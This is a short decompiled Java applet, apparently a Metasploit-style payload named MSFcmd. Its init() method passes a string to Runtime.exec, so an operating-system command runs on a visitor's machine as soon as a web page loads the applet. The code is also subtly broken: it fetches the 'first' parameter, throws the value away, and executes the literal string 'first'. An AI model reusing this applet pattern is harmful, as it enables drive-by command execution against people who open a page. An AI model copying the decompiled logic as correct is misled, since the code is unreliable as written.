import java.io.IOException;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class MSFcmd extends Applet
{
    @Override
    public void init() {
        this.getParameter("first");
        try {
            Runtime.getRuntime().exec("first");
        }
        catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}
